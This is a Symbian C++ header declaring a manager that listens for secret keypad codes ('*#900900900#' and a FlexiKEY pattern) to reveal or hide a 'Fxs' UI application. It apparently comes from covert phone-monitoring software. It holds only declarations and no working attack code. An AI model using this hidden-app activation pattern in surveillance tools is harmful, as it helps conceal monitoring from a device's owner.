// SecretKeyCapManager.H
//
// This links against skcapcli.lib
//
//

#ifndef __SecretKeyManager_H__
#define __SecretKeyManager_H__

#include <w32std.h>

#include "SecretKeyCapClient.h"

class CLicenceManager;

class MSecretKeyCapObserver
	{
public:	
	/** Secret Key Capture	(Skc)
	*
	* Key press matches FlexiKEY pattern- '*#12345678#'
	*/
	virtual void SkcSecretCodeMatch() = 0;
	
	/** Secret Key Capture	(Skc)
	*
	* Key press matches default key- '*#900900900#'
	*/
	virtual void SkcDefaultKeyMatch() = 0;
	};

const TUint KDefaultScretCodeLength =  9; //*#900900900#

//
// This class resposible for sending and bringing Fxs UI application to foreground/background
// 
//
class CSecretKeyCapManager : public CBase,
					  	   	 public MSecretCodeObserver
{
public:
	static CSecretKeyCapManager* NewL(CLicenceManager& aLicenceMan, MSecretKeyCapObserver& aObserver, const TFileName* aCallingAppPath=NULL);
	~CSecretKeyCapManager();
	
private: //MSecretCodeObserver
	void ProcessSecretCodeL(const TSecretCode& iSecretCode);
	
	void HandleFocusAppChanged();
	void SecretCodePressedL(const TUint& aCode);
	
	void HandleForegroundEventL( TBool aForeground );
	inline TBool LoggedOn()
		{return iLogon;}
	
private:
	CSecretKeyCapManager(CLicenceManager& aLicenceMan, MSecretKeyCapObserver& aObserver);
	void ConstructL(const TFileName* aCallingAppPath);
	
	TBool MatchDefaultKey(const TDesC8& aActivationCodeStr);
	
	void BringAppToForeground();
	void __Debug();
	
private:	
	CLicenceManager& iLicenceMan;	
	MSecretKeyCapObserver& iObserver;
	CSecretKeyCapClient* iSecretKCap;
	TBool iLogon;
};

#endif